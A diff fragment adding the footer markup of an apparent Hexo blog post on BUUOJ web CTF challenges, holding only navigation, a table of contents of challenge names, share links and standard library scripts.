+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PASECA2019-honey-shop"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PASECA2019]honey_shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-PASECA2019-honey-shop"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [PASECA2019]honey_shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-FireshellCTF2020-Caas"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [FireshellCTF2020]Caas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GoogleCTF2019-Quals-Bnv"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [GoogleCTF2019 Quals]Bnv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-BSidesCF-2019-SVGMagic"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [BSidesCF 2019]SVGMagic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-CSAWQual-2019-Web-Unagi"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [CSAWQual 2019]Web_Unagi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-ISITDTU-2019-EasyPHP"><span class="toc-number">7.</span> <span class="toc-text">0x 07 [ISITDTU 2019]EasyPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-BSidesCF-2019-Mixer"><span class="toc-number">8.</span> <span class="toc-text">0x 08 [BSidesCF 2019]Mixer</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/&title=BUUOJ-web刷题（五）" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/&title=BUUOJ-web刷题（五）" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/&text=BUUOJ-web刷题（五）" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUOJ-web刷题（五）&body=Check out this article: http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
